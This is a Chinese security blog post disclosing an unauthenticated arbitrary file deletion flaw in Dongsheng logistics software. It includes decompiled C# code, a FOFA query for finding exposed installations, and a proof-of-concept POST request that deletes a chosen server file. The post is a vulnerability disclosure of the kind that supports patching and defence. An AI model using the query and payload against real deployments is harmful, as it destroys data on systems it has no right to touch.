---
title: "东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞"
source: https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html
asset_dir: assets/东胜物流软件-softmngfileinputhandlerdelete-文件删除漏洞
---

# 东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/8 08:31
- 234浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

开发

软件开发

application

---

# 漏洞简介

东胜物流[软件](#)是由青岛东胜伟业软件有限公司开发的一款综合性物流管理系统，广泛应用于物流行业，提供订单管理、仓库管理、运输管理等多种功能，旨在提升物流业务效率。该软件的 `/SoftMng/FileInputHandler/Delete` 接口存在文件删除[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。此接口是 `FileInputHandler` 模块的一部分，通常负责处理文件相关的操作。攻击者可能利用此漏洞，[未经授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)地调用该接口，并指定服务器上的任意文件路径进行删除。

物流软件安全

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"

# 漏洞分析

路由相关参考上一篇[东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞](https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Upload-RCE.html)部分，在同一个Controller下找到**Delete**方法

```
public JsonResult Delete(List<FileClass> filepath)
{
  try
  {
    string str1 = this.Request[nameof (filepath)];
    if (!string.IsNullOrEmpty(str1))
      filepath = new JavaScriptSerializer().Deserialize<List<FileClass>>(str1);
    foreach (FileClass fileClass in filepath)
    {
      string str2 = this.Server.MapPath(fileClass.url);
      if (System.IO.File.Exists(str2))
        System.IO.File.Delete(str2);
    }
    return this.Json((object) new
    {
      success = true,
      msg = "删除成功"
    });
  }
  catch (Exception ex)
  {
    return this.Json((object) new
    {
      success = false,
      msg = ex.Message
    });
  }
}
```

- `fileClass.url` 完全受用户控制
- `Server.MapPath` 将相对路径转换为物理路径,但未做任何白名单限制
- 未验证文件所属目录是否在允许删除的范围内
- 没有权限检查,任何经过身份验证的用户都可以删除任意文件

# 漏洞复现

深入探索

安全研究工具

企业安全咨询

漏洞修复方案

先上传一个png文件作为测试文件

漏洞预警服务

[![东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞](images/img-001-2d5d7942cce7.webp)](https://image.mrxn.net/93d900c23227430baf649ac94bb86005.webp)

删除上传回显的文件路径

```
POST /SoftMng/FileInputHandler/Delete HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

filepath=[{"url":"/UploadFiles/Filepuload/202xxx/xxxxx.png"}]
```

再次访问 404 ，证明删除成功

软件

[![东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞](images/img-002-ec48849f132e.webp)](https://image.mrxn.net/640c128bc929414e8012bc78ee123352.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
